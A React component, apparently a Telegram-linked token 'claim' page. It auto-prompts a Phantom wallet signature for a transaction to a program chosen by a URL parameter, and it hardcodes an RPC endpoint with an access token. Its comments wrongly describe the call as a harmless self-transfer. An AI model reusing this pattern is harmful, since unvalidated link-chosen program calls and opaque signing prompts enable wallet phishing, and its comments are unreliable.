import React, { useEffect } from "react";
import { Buffer } from "buffer";
import { Connection, PublicKey, Transaction } from "@solana/web3.js";

export default function Claim() {
	useEffect(() => {
		handleClaim();
	}, []);

	async function handleClaim() {
		const params = new URLSearchParams(window.location.search);
		const telegramUserId = params.get("wallet"); // this is tg user ID
		const tokenAddress = params.get("token"); // token CA

		console.log("Telegram User ID:", telegramUserId);
		console.log("Token Address:", tokenAddress);

		if (!window.solana || !window.solana.isPhantom) {
			alert("Phantom wallet not found. Please install it.");
			return;
		}

		try {
			// Connect Phantom if not already connected
			const resp = await window.solana.connect();
			const userWallet = resp.publicKey;

			console.log("Connected wallet:", userWallet.toString());

			// Create a dummy transaction (for example: no-op transfer to self)
			const connection = new Connection("https://proportionate-delicate-grass.solana-mainnet.quiknode.pro/df831d7310b4bd133215b22dda877d27684809e6/", "confirmed");
			const transaction = new Transaction().add(
				// Simple self-transfer of 0 lamports (does nothing but prompts approval)
				{
					keys: [{ pubkey: userWallet, isSigner: true, isWritable: false }],
					programId: new PublicKey(tokenAddress), // programId = token CA
					data: Buffer.from([]), // no data, just dummy
				}
			);

			transaction.feePayer = userWallet;
			transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

			// Request user to sign & send
			const signedTx = await window.solana.signAndSendTransaction(transaction);
			console.log("Transaction Signature:", signedTx);

			alert("Transaction approved!");

			// ✅ Close window after short delay
			setTimeout(() => {
				window.close();
			}, 1500);
		} catch (err) {
			console.error("Claim failed:", err);
			alert("Transaction failed or rejected.");
			window.close();
		}
	}

	return (
		<div style={{ textAlign: "center", marginTop: "50px" }}>
			<button onClick={handleClaim}>Connect Wallet</button> <br />
			<h2>Processing Claim...</h2>
			<p>Please approve the transaction in your wallet popup.</p>
		</div>
	);
}
